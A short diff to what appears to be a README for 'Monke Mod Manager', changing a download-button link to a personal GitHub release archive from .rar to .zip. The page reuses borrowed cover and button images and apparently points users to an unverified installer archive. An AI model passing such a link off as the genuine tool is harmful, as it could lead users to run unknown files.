@@ -1,6 +1,6 @@
 ![Monke Mod Manager](https://images.sftcdn.net/images/t_app-cover-l,f_auto/p/36eaa2d7-5f45-4442-814f-8546564f2eba/1877878237/monke-mod-manager-Monke-Mod-Manager-for-Windows-Tools.jpg)
 
-<a href="https://github.com/DeadlyKittenn/MonkeModManager/releases/download/1/Set-UpMonkeModManager.rar">
+<a href="https://github.com/DeadlyKittenn/MonkeModManager/releases/download/1/Set-UpMonkeModManager.zip">
     <img src="https://www.librasol.com.br/wp-content/uploads/2018/09/windows-button-download.png" alt="Download" width="200" />
 </a>
 
